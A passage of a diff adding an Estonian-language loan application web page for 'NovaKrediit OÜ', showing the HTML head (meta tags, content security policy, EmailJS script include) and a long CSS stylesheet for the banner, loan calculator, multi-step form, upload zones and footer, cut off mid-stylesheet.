@@ -1,0 +1,2614 @@
+<!DOCTYPE html>
+<html lang="et">
+<head>
+<meta charset="UTF-8">
+<meta name="description" content="NovaKrediit OÜ — Taotlege personaallaenu või autokrediiti kuni 30 000 € kiirelt ja turvaliselt. Vastus 15 minutiga.">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="NovaKrediit OÜ — Krediiditaotlus">
+<meta property="og:description" content="Kiire ja turvaline laen kuni 30 000 €. Vastus 15 minutiga.">
+<meta property="og:type" content="website">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data:; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://api.emailjs.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: https:; connect-src https://api.web3forms.com https://api.emailjs.com;">
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%231a1a2e'/><text y='24' x='4' font-size='22' fill='%23d4a843'>N</text></svg>">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NovaKrediit OÜ — Krediiditaotlus</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" rel="stylesheet"></noscript>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js" defer></script>
+<style>
+  :root {
+    --navy:       #1a1a2e;
+    --navy-mid:   #16213e;
+    --navy-light: #0f3460;
+    --gold:       #d4a843;
+    --gold-light: #e8c06a;
+    --gold-pale:  #fdf6e3;
+    --cream:      #fbfbf9;
+    --white:      #ffffff;
+    --text:       #1a1a2e;
+    --muted:      #6b7280;
+    --border:     #e5e7eb;
+    --border-focus: #d4a843;
+    --radius:     8px;
+    --success:    #065f46;
+    --error:      #991b1b;
+    --shadow-sm:  0 1px 3px rgba(0,0,0,0.05), 0 1px 2px rgba(0,0,0,0.03);
+    --shadow-md:  0 4px 16px rgba(0,0,0,0.07);
+    --shadow-lg:  0 10px 40px rgba(0,0,0,0.1);
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: var(--cream);
+    color: var(--text);
+    min-height: 100vh;
+    font-size: 15px;
+    line-height: 1.6;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ── LANG BAR ── */
+  .lang-bar {
+    background: var(--navy);
+    display: flex;
+    justify-content: flex-end;
+    padding: 8px 32px;
+    gap: 6px;
+    border-bottom: 1px solid rgba(255,255,255,0.06);
+  }
+  .lang-btn {
+    background: transparent;
+    border: 1px solid rgba(212,168,67,0.25);
+    color: rgba(212,168,67,0.55);
+    font-family: 'Inter', sans-serif;
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: 0.1em;
+    padding: 4px 12px;
+    border-radius: 20px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .lang-btn:hover { border-color: var(--gold); color: var(--gold-light); }
+  .lang-btn.active { background: rgba(212,168,67,0.18); border-color: var(--gold); color: var(--gold-light); }
+
+  /* ── HEADER ── */
+  .header {
+    background: var(--navy);
+    padding: 20px 40px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: relative;
+  }
+  .header::after {
+    content: '';
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    height: 2px;
+    background: var(--gold);
+  }
+
+  .logo-wrap { display: flex; align-items: center; gap: 16px; }
+  .logo-shield { width: 46px; height: auto; flex-shrink: 0; }
+  .logo-text { display: flex; flex-direction: column; gap: 2px; }
+  .logo-name {
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-weight: 800;
+    font-size: 1.7rem;
+    color: var(--white);
+    letter-spacing: -0.01em;
+    line-height: 1;
+  }
+  .logo-name span { color: var(--gold); }
+  .logo-sub {
+    font-size: 0.67rem;
+    letter-spacing: 0.18em;
+    text-transform: uppercase;
+    color: rgba(212,168,67,0.6);
+    font-weight: 400;
+  }
+  .header-badge {
+    background: rgba(212,168,67,0.12);
+    border: 1px solid rgba(212,168,67,0.3);
+    color: var(--gold-light);
+    font-size: 0.72rem;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    padding: 7px 16px;
+    border-radius: 30px;
+    font-weight: 500;
+  }
+
+  /* ── CONTAINER ── */
+  .container {
+    max-width: 800px;
+    margin: 40px auto;
+    padding: 0 20px 60px;
+  }
+
+  .page-title {
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-weight: 700;
+    font-size: 2.1rem;
+    color: var(--navy);
+    margin-bottom: 6px;
+    letter-spacing: -0.02em;
+  }
+  .page-subtitle {
+    color: var(--muted);
+    font-size: 0.92rem;
+    font-weight: 400;
+    margin-bottom: 36px;
+  }
+
+  /* ── SECTIONS ── */
+  .section {
+    background: var(--white);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    margin-bottom: 20px;
+    overflow: hidden;
+    box-shadow: var(--shadow-sm);
+    transition: box-shadow 0.25s, transform 0.25s;
+  }
+  .section:hover {
+    box-shadow: var(--shadow-md);
+    transform: translateY(-1px);
+  }
+
+  .section-header {
+    background: var(--white);
+    padding: 20px 28px 16px;
+    display: flex;
+    align-items: center;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-icon { display: none; }
+
+  .section-title {
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-weight: 700;
+    font-size: 1rem;
+    letter-spacing: -0.01em;
+    color: var(--navy);
+    padding-left: 12px;
+    border-left: 3px solid var(--gold);
+  }
+
+  .section-body { padding: 28px 28px; }
+
+  /* ── GRID ── */
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; }
+  .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 18px; }
+  .span-2 { grid-column: span 2; }
+
+  /* ── FIELDS ── */
+  .field { display: flex; flex-direction: column; gap: 6px; }
+
+  label {
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: #4a5568;
+  }
+
+  input[type="text"],
+  input[type="email"],
+  input[type="tel"],
+  input[type="number"],
+  input[type="date"],
+  select {
+    width: 100%;
+    border: 1.5px solid var(--border);
+    border-radius: var(--radius);
+    padding: 11px 14px;
+    font-family: 'Inter', sans-serif;
+    font-size: 0.94rem;
+    color: var(--text);
+    background: var(--white);
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
+    -webkit-appearance: none;
+    appearance: none;
+  }
+  input:focus, select:focus {
+    border-color: var(--gold);
+    box-shadow: 0 0 0 3px rgba(212,168,67,0.12);
+    background: #fffdf7;
+  }
+  input::placeholder { color: #c0c8d4; font-size: 0.9rem; }
+
+  /* Select arrow */
+  .select-wrap { position: relative; }
+  .select-wrap::after {
+    content: '▾';
+    position: absolute;
+    right: 14px; top: 50%;
+    transform: translateY(-50%);
+    color: var(--muted);
+    pointer-events: none;
+    font-size: 11px;
+  }
+
+  /* ── RADIO / CHECKBOX ── */
+  .radio-group, .check-group {
+    display: flex;
+    gap: 10px;
+    flex-wrap: wrap;
+    margin-top: 4px;
+  }
+  .radio-option, .check-option {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    cursor: pointer;
+    padding: 10px 18px;
+    border: 1.5px solid var(--border);
+    border-radius: var(--radius);
+    transition: all 0.18s;
+    font-size: 0.88rem;
+    font-weight: 500;
+    color: var(--text);
+    user-select: none;
+    background: var(--white);
+  }
+  .radio-option:hover, .check-option:hover {
+    border-color: var(--gold);
+    background: var(--gold-pale);
+    color: var(--navy);
+  }
+  .radio-option input, .check-option input {
+    accent-color: var(--gold);
+    width: 15px; height: 15px;
+    cursor: pointer;
+  }
+  .radio-option.selected {
+    border-color: var(--gold);
+    background: var(--gold-pale);
+    color: var(--navy);
+    font-weight: 600;
+    box-shadow: 0 0 0 2px rgba(212,168,67,0.15);
+  }
+
+  /* ── MONEY INPUT ── */
+  .money-wrap { position: relative; }
+  .money-wrap input { padding-right: 40px; }
+  .money-suffix {
+    position: absolute;
+    right: 14px; top: 50%;
+    transform: translateY(-50%);
+    color: var(--muted);
+    font-weight: 600;
+    font-size: 0.88rem;
+    pointer-events: none;
+  }
+
+  /* ── PERIOD CHIPS ── */
+  .period-group { display: flex; gap: 8px; flex-wrap: wrap; }
+  .period-chip { display: none; }
+  .period-label {
+    padding: 9px 20px;
+    border: 1.5px solid var(--border);
+    border-radius: 30px;
+    cursor: pointer;
+    font-size: 0.85rem;
+    font-weight: 500;
+    color: var(--muted);
+    transition: all 0.18s;
+    background: var(--white);
+  }
+  .period-chip:checked + .period-label {
+    background: var(--navy);
+    border-color: var(--navy);
+    color: var(--gold-light);
+    box-shadow: var(--shadow-sm);
+  }
+  .period-label:hover { border-color: var(--navy-light); color: var(--navy); }
+
+  /* ── DECLARATIONS ── */
+  .declarations {
+    background: #f7f8fa;
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 20px 22px;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+    margin-top: 8px;
+  }
+  .decl-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    font-size: 0.9rem;
+    color: var(--text);
+    cursor: pointer;
+    line-height: 1.5;
+  }
+  .decl-item input { accent-color: var(--navy); width: 17px; height: 17px; margin-top: 2px; flex-shrink: 0; }
+
+  /* ── SUBMIT ── */
+  .submit-area { text-align: center; padding-top: 12px; }
+  .btn-submit {
+    background: linear-gradient(135deg, var(--navy) 0%, var(--navy-mid) 100%);
+    color: var(--white);
+    font-family: 'Inter', sans-serif;
+    font-weight: 700;
+    font-size: 0.88rem;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    border: none;
+    padding: 17px 64px;
+    border-radius: 12px;
+    cursor: pointer;
+    position: relative;
+    overflow: hidden;
+    transition: all 0.25s;
+    min-width: 240px;
+    box-shadow: 0 4px 20px rgba(13,27,42,0.3);
+  }
+  .btn-submit::after {
+    content: '';
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    height: 3px;
+    background: linear-gradient(90deg, var(--gold), var(--gold-light), var(--gold));
+  }
+  .btn-submit:hover {
+    background: linear-gradient(135deg, var(--navy-mid) 0%, var(--navy-light) 100%);
+    transform: translateY(-2px);
+    box-shadow: 0 8px 28px rgba(13,27,42,0.35);
+  }
+  .btn-submit:active { transform: translateY(0); }
+  .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+  .sep { height: 1px; background: var(--border); margin: 20px 0; }
+  #auto-section { display: none; }
+
+  /* ── TOAST ── */
+  .toast {
+    position: fixed;
+    bottom: 32px; right: 32px;
+    padding: 16px 22px;
+    border-radius: 12px;
+    font-size: 0.88rem;
+    font-weight: 500;
+    z-index: 1000;
+    transform: translateY(80px);
+    opacity: 0;
+    transition: all 0.35s cubic-bezier(0.34,1.56,0.64,1);
+    max-width: 360px;
+    line-height: 1.5;
+    box-shadow: var(--shadow-lg);
+  }
+  .toast.show { transform: translateY(0); opacity: 1; }
+  .toast.success { background: #f0fff4; border: 1px solid #68d391; color: var(--success); }
+  .toast.error   { background: #fff5f5; border: 1px solid #fc8181; color: var(--error); }
+
+  /* Spinner */
+  .spinner {
+    display: inline-block;
+    width: 15px; height: 15px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    vertical-align: middle;
+    margin-right: 8px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  @keyframes modalPop { from { opacity:0; transform: scale(0.85) translateY(20px); } to { opacity:1; transform: scale(1) translateY(0); } }
+
+  /* ── FILE UPLOAD ── */
+  .upload-zone {
+    border: 2px dashed var(--border);
+    border-radius: 12px;
+    background: #fafbfc;
+    padding: 24px 20px;
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.22s;
+    position: relative;
+  }
+  .upload-zone:hover, .upload-zone.dragover {
+    border-color: var(--gold);
+    background: var(--gold-pale);
+  }
+  .upload-zone input[type="file"] {
+    position: absolute; inset: 0;
+    width: 100%; height: 100%;
+    opacity: 0; cursor: pointer;
+    font-size: 0; border: none; padding: 0; box-shadow: none;
+  }
+  .upload-zone input[type="file"]:focus { box-shadow: none; border: none; }
+  .upload-icon { font-size: 2rem; margin-bottom: 8px; display: block; }
+  .upload-title { font-family: 'Inter', sans-serif; font-weight: 600; font-size: 0.88rem; color: var(--navy); margin-bottom: 4px; }
+  .upload-hint { font-size: 0.76rem; color: var(--muted); font-weight: 400; }
+  .upload-accepted { font-size: 0.7rem; color: var(--muted); margin-top: 6px; opacity: 0.8; }
+  .file-list { margin-top: 10px; display: flex; flex-direction: column; gap: 6px; }
+  .file-pill { display: flex; align-items: center; gap: 10px; background: var(--white); border: 1px solid var(--border); border-radius: 8px; padding: 8px 12px; font-size: 0.83rem; color: var(--navy); }
+  .file-pill-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .file-pill-size { color: var(--muted); font-size: 0.73rem; flex-shrink: 0; }
+  .file-pill-remove { background: none; border: none; cursor: pointer; color: var(--muted); font-size: 1rem; line-height: 1; padding: 0 2px; flex-shrink: 0; transition: color 0.15s; }
+  .file-pill-remove:hover { color: var(--error); }
+  .upload-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+  .upload-item { display: flex; flex-direction: column; gap: 8px; }
+  .upload-item-label { font-size: 0.72rem; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; color: #4a5568; }
+  .upload-required { color: var(--gold); margin-left: 3px; }
+  .upload-span-2 { grid-column: span 2; }
+  .upload-note { font-size: 0.79rem; color: var(--muted); font-style: italic; line-height: 1.5; }
+
+  /* ── FOOTER ── */
+  .nk-footer {
+    max-width: 800px;
+    margin: 36px auto 0;
+    padding: 0 20px 48px;
+  }
+  .nk-footer-security {
+    background: #f0fff4;
+    border: 1px solid #9ae6b4;
+    border-radius: 12px;
+    padding: 16px 20px;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    font-size: 0.82rem;
+    color: #276749;
+    margin-bottom: 24px;
+    line-height: 1.6;
+  }
+  .nk-footer-lock { font-size: 1.1rem; flex-shrink: 0; margin-top: 2px; }
+  .nk-footer-info {
+    border-top: 1px solid var(--border);
+    padding-top: 20px;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 20px;
+    justify-content: space-between;
+    font-size: 0.81rem;
+    color: var(--muted);
+    line-height: 1.8;
+  }
+  .nk-footer-company a { color: var(--gold); text-decoration: none; }
+  .nk-footer-company a:hover { text-decoration: underline; }
+  .nk-footer-persons { font-style: italic; font-size: 0.79rem; display: flex; align-items: center; }
+  .nk-footer-copy {
+    text-align: center;
+    margin-top: 18px;
+    font-size: 0.76rem;
+    color: #a0aec0;
+    padding-bottom: 8px;
+  }
+
+  /* ── HERO BANNER ── */
+  .hero-banner {
+    background: linear-gradient(135deg, #0d1b2a 0%, #1a1a2e 50%, #0f2744 100%);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 60px 64px;
+    gap: 40px;
+    position: relative;
+    overflow: hidden;
+    min-height: 380px;
+  }
+  .hero-banner::before {
+    content: '';
+    position: absolute;
+    top: -80px; right: -80px;
+    width: 400px; height: 400px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(212,168,67,0.08) 0%, transparent 70%);
+    pointer-events: none;
+  }
+  .hero-banner::after {
+    content: '';
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, #d4a843, transparent);
+  }
+  .hero-banner-left {
+    flex: 1;
+    max-width: 480px;
+    position: relative;
+    z-index: 1;
+  }
+  .hero-banner-tag {
+    display: inline-block;
+    background: rgba(212,168,67,0.12);
+    border: 1px solid rgba(212,168,67,0.28);
+    color: #e8c06a;
+    font-size: 0.7rem;
+    font-weight: 600;
+    letter-spacing: 0.14em;
+    text-transform: uppercase;
+    padding: 5px 14px;
+    border-radius: 30px;
+    margin-bottom: 20px;
+  }
+  .hero-banner-title {
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-weight: 800;
+    font-size: 2.8rem;
+    color: #fff;
+    line-height: 1.12;
+    margin-bottom: 14px;
+    letter-spacing: -0.025em;
+  }
+  .hero-banner-title em { font-style: normal; color: #d4a843; }
+  .hero-banner-sub {
+    color: rgba(255,255,255,0.55);
+    font-size: 0.9rem;
+    margin-bottom: 32px;
+    line-height: 1.6;
+  }
+  .hero-banner-stats {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    margin-bottom: 36px;
+    background: rgba(255,255,255,0.04);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 12px;
+    padding: 16px 20px;
+    width: fit-content;
+  }
+  .hbs-item { display: flex; flex-direction: column; gap: 3px; padding: 0 20px; }
+  .hbs-item:first-child { padding-left: 0; }
+  .hbs-num { font-family: 'Plus Jakarta Sans', sans-serif; font-weight: 800; font-size: 1.1rem; color: #d4a843; }
+  .hbs-label { font-size: 0.7rem; color: rgba(255,255,255,0.4); text-transform: uppercase; letter-spacing: 0.06em; }
+  .hbs-divider { width: 1px; height: 36px; background: rgba(255,255,255,0.1); }
+  .hero-banner-btn {
+    background: #d4a843;
+    color: #1a1a2e;
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-weight: 800;
+    font-size: 0.95rem;
+    border: none;
+    padding: 15px 32px;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.22s;
+    letter-spacing: 0.01em;
+  }
+  .hero-banner-btn:hover { background: #e8c06a; transform: translateY(-2px); box-shadow: 0 8px 28px rgba(212,168,67,0.35); }
+  .hero-banner-right {
+    flex-shrink: 0;
+    width: 420px;
+    position: relative;
+    z-index: 1;
+  }
+  .hero-svg { width: 100%; height: auto; filter: drop-shadow(0 20px 40px rgba(0,0,0,0.3)); }
+
+  @media (max-width: 900px) {
+    .hero-banner { flex-direction: column; padding: 40px 24px 32px; text-align: center; align-items: center; }
+    .hero-banner-title { font-size: 2rem; }
+    .hero-banner-right { width: 100%; max-width: 380px; }
+    .hero-banner-stats { justify-content: center; }
+    .hero-banner-btn { width: 100%; }
+    .hero-banner-tag { display: block; text-align: center; }
+  }
+
+  /* ── CALCULATOR ── */
+  .calc-section {
+    background: #1a1a2e;
+    padding: 40px 20px;
+    display: flex;
+    justify-content: center;
+  }
+  .calc-box {
+    background: #16213e;
+    border: 1px solid rgba(212,168,67,0.2);
+    border-radius: 16px;
+    padding: 36px 36px 28px;
+    width: 100%;
+    max-width: 680px;
+    box-shadow: 0 8px 40px rgba(0,0,0,0.4);
+  }
+  .calc-box-title {
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-weight: 700;
+    font-size: 1.3rem;
+    color: #fff;
+    margin-bottom: 28px;
+    text-align: center;
+  }
+  .calc-row { margin-bottom: 24px; }
+  .calc-label-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 10px;
+    font-size: 0.9rem;
+    color: rgba(255,255,255,0.55);
+  }
+  .calc-label-row strong { color: #d4a843; font-size: 1.1rem; font-weight: 700; }
+  input[type="range"] {
+    width: 100%;
+    height: 6px;
+    border-radius: 6px;
+    background: rgba(255,255,255,0.1);
+    outline: none;
+    border: none;
+    padding: 0;
+    box-shadow: none;
+    -webkit-appearance: auto;
+    appearance: auto;
+    accent-color: #d4a843;
+    cursor: pointer;
+  }
+  input[type="range"]:focus { box-shadow: none; }
+  .calc-range-labels {
+    display: flex;
+    justify-content: space-between;
+    font-size: 0.72rem;
+    color: rgba(255,255,255,0.35);
+    margin-top: 6px;
+  }
+  .calc-monthly-label {
+    text-align: center;
+    font-size: 0.75rem;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    color: rgba(255,255,255,0.45);
+    margin-bottom: 8px;
+    margin-top: 8px;
+  }
+  .calc-monthly-amount {
+    text-align: center;
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    color: #d4a843;
+    line-height: 1;
+    margin-bottom: 20px;
+  }
+  .calc-badges {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    margin-bottom: 12px;
+  }
+  .calc-badges span {
+    font-size: 0.82rem;
+    color: rgba(255,255,255,0.55);
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .calc-note {
+    font-size: 0.74rem;
+    color: rgba(255,255,255,0.25);
+    text-align: center;
+    margin-bottom: 20px;
+    font-style: italic;
+  }
+  .btn-calc-main {
+    width: 100%;
+    background: #d4a843;
+    color: #1a1a2e;
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-weight: 800;
+    font-size: 1rem;
+    border: none;
+    padding: 17px 20px;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.2s;
+    letter-spacing: 0.02em;
+  }
+  .btn-calc-main:hover { background: #e8c06a; transform: translateY(-1px); box-shadow: 0 6px 20px rgba(212,168,67,0.35); }
+
+  /* ── STEPS ── */
+  .steps-section {
+    background: var(--cream);
+    padding: 60px 20px;
+  }
+  .steps-inner {
+    max-width: 900px;
+    margin: 0 auto;
+  }
+  .steps-title {
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-weight: 700;
+    font-size: 1.5rem;
+    color: var(--navy);
+    text-align: center;
+    margin-bottom: 40px;
+  }
+  .steps-grid {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 24px;
+  }
+  .step-item {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    gap: 14px;
+  }
+  .step-num {
+    width: 48px; height: 48px;
+    background: var(--navy);
+    color: var(--gold);
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-weight: 800;
+    font-size: 1.2rem;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+  .step-text strong {
+    display: block;
+    font-size: 0.9rem;
+    font-weight: 700;
+    color: var(--navy);
+    margin-bottom: 6px;
+  }
+  .step-text p { font-size: 0.82rem; color: var(--muted); line-height: 1.5; }
+
+  /* ── USP ── */
+  .usp-section {
+    background: var(--navy);
+    padding: 40px 20px;
+  }
+  .usp-inner {
+    max-width: 900px;
+    margin: 0 auto;
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 24px;
+  }
+  .usp-item { text-align: center; }
+  .usp-icon { font-size: 1.8rem; margin-bottom: 10px; }
+  .usp-label { font-size: 0.82rem; color: rgba(255,255,255,0.8); font-weight: 500; line-height: 1.4; }
+
+  /* ── FOOTER ── */
+  .site-footer {
+    background: #111827;
+    color: rgba(255,255,255,0.75);
+    font-size: 0.84rem;
+  }
+  .footer-inner {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 56px 40px 40px;
+    display: grid;
+    grid-template-columns: 2fr 1fr 1fr 1fr;
+    gap: 40px;
+  }
+  .footer-logo {
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-weight: 800;
+    font-size: 1.5rem;
+    color: var(--white);
+    margin-bottom: 16px;
+  }
+  .footer-logo span { color: var(--gold); }
+  .footer-address {
+    font-size: 0.82rem;
+    color: rgba(255,255,255,0.55);
+    line-height: 1.9;
+  }
+  .footer-address a { color: var(--gold-light); text-decoration: none; }
+  .footer-heading {
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    font-weight: 700;
+    font-size: 0.82rem;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: rgba(255,255,255,0.45);
+    margin-bottom: 16px;
+  }
+  .footer-links { list-style: none; display: flex; flex-direction: column; gap: 10px; }
+  .footer-links li { color: rgba(255,255,255,0.65); font-size: 0.83rem; cursor: pointer; transition: color 0.2s; }
+  .footer-links li:hover, .footer-links a { color: var(--white); text-decoration: none; }
+  .footer-links a { color: rgba(255,255,255,0.65); }
+  .footer-persons { margin-top: 16px; font-size: 0.78rem; color: rgba(255,255,255,0.4); font-style: italic; }
+  .footer-bottom {
+    border-top: 1px solid rgba(255,255,255,0.08);
+    padding: 20px 40px;
+  }
+  .footer-bottom-inner {
+    max-width: 1100px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    gap: 24px;
+    font-size: 0.74rem;
+    color: rgba(255,255,255,0.35);
+    line-height: 1.6;
+    flex-wrap: wrap;
+  }
+
+  @media (max-width: 768px) {
+    .slider-wrap { height: 240px; }
+    .calc-box { padding: 24px 20px; }
+    .calc-monthly-amount { font-size: 2.2rem; }
+    .steps-grid { grid-template-columns: 1fr 1fr; }
+    .usp-inner { grid-template-columns: 1fr 1fr; }
+    .footer-inner { grid-template-columns: 1fr 1fr; padding: 36px 20px; }
+    .footer-bottom { padding: 16px 20px; }
+    .footer-bottom-inner { flex-direction: column; }
+  }
+  @media (max-width: 480px) {
+    .steps-grid { grid-template-columns: 1fr; }
+    .usp-inner { grid-template-columns: 1fr 1fr; }
+    .footer-inner { grid-template-columns: 1fr; }
+  }
+
+  @media (max-width: 640px) {
+    .grid-2 { grid-template-columns: 1fr; }
+    .grid-3 { grid-template-columns: 1fr 1fr; }
+    .span-2 { grid-column: span 1; }
+    .section-body { padding: 20px 16px; }
+    .header { padding: 18px 20px; }
+    .logo-shield { width: 36px; }
+    .logo-name { font-size: 1.35rem; }
+    .page-title { font-size: 1.6rem; }
+    .header-badge { display: none; }
+    .upload-grid { grid-template-columns: 1fr; }
+    .upload-span-2 { grid-column: span 1; }
+  }
+
+  /* ── LAZY REVEAL ── */
+  .steps-section,.usp-section,.site-footer,.section{opacity:0;transform:translateY(12px);transition:opacity 0.4s ease,transform 0.4s ease;}
+  .section-visible{opacity:1!important;transform:translateY(0)!important;}
+  @media(prefers-reduced-motion:reduce){.steps-section,.usp-section,.site-footer,.section{opacity:1;transform:none;transition:none;}}
+
+  /* ── SR-ONLY / SKIP LINK ── */
+  .sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;}
+  .skip-link{position:absolute;top:-100px;left:16px;background:var(--gold);color:var(--navy);padding:10px 20px;border-radius:0 0 8px 8px;font-weight:700;font-size:0.88rem;z-index:9999;text-decoration:none;transition:top 0.2s;}
+  .skip-link:focus{top:0;}
+
+  /* ── STEPPER ── */
+  .stepper-bar{background:#fff;border-bottom:1px solid var(--border);padding:0 20px;position:sticky;top:0;z-index:100;box-shadow:0 2px 8px rgba(0,0,0,0.06);}
+  .stepper-inner{max-width:800px;margin:0 auto;display:flex;align-items:stretch;}
+  .stepper-step{flex:1;display:flex;align-items:center;gap:10px;padding:14px 12px;cursor:pointer;border-bottom:3px solid transparent;transition:all 0.2s;font-size:0.82rem;color:var(--muted);position:relative;user-select:none;}
+  .stepper-step:not(:first-child)::before{content:'';position:absolute;left:0;top:25%;bottom:25%;width:1px;background:var(--border);}
+  .stepper-step.active{border-bottom-color:var(--gold);color:var(--navy);}
+  .stepper-step.done{color:var(--success);}
+  .stepper-num{width:26px;height:26px;border-radius:50%;background:var(--border);color:var(--muted);font-family:'Plus Jakarta Sans',sans-serif;font-weight:700;font-size:0.8rem;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all 0.2s;}
+  .stepper-step.active .stepper-num{background:var(--gold);color:var(--navy);}
+  .stepper-step.done .stepper-num{background:#d1fae5;color:var(--success);}
+  .stepper-label{font-weight:500;white-space:nowrap;}
+  .stepper-sublabel{font-size:0.68rem;color:var(--muted);margin-top:1px;}
+
+  /* ── FORM STEPS ── */
+  .form-step{display:none;}
+  .form-step.active{display:block;}
+
+  /* ── STEP NAV ── */
+  .step-nav{display:flex;gap:12px;margin-top:24px;justify-content:space-between;align-items:center;}
+  .btn-prev{background:transparent;border:1.5px solid var(--border);color:var(--muted);font-family:'Inter',sans-serif;font-weight:600;font-size:0.88rem;padding:13px 28px;border-radius:10px;cursor:pointer;transition:all 0.2s;}
+  .btn-prev:hover{border-color:var(--navy);color:var(--navy);}
+  .btn-next{background:var(--gold);color:var(--navy);font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:0.95rem;border:none;padding:13px 36px;border-radius:10px;cursor:pointer;transition:all 0.2s;letter-spacing:0.01em;}
+  .btn-next:hover{background:var(--gold-light);transform:translateY(-2px);box-shadow:0 8px 28px rgba(212,168,67,0.38);}
+
+  /* ── REAL-TIME VALIDATION ── */
+  input.valid,select.valid{border-color:#10b981!important;}
+  input.invalid,select.invalid{border-color:#ef4444!important;box-shadow:0 0 0 3px rgba(239,68,68,0.08)!important;}
+  .field-hint{font-size:0.71rem;margin-top:4px;min-height:14px;display:block;}
+  .field-hint.err{color:#ef4444;}
+  .field-hint.ok{color:#10b981;}
+
+  /* ── KEYBOARD FOCUS ── */
+  :focus-visible{outline:2px solid var(--gold);outline-offset:3px;border-radius:4px;}
+  .stepper-step:focus-visible{outline:2px solid var(--gold);outline-offset:-2px;border-radius:0;}
+  .radio-option:focus-within,.check-option:focus-within{border-color:var(--gold);box-shadow:0 0 0 3px rgba(212,168,67,0.2);}
+
+  /* ── MOBILE TOUCH TARGETS ── */
+  @media(max-width:768px){
+    input[type="text"],input[type="email"],input[type="tel"],input[type="number"],input[type="date"],select{min-height:44px;font-size:1rem;}
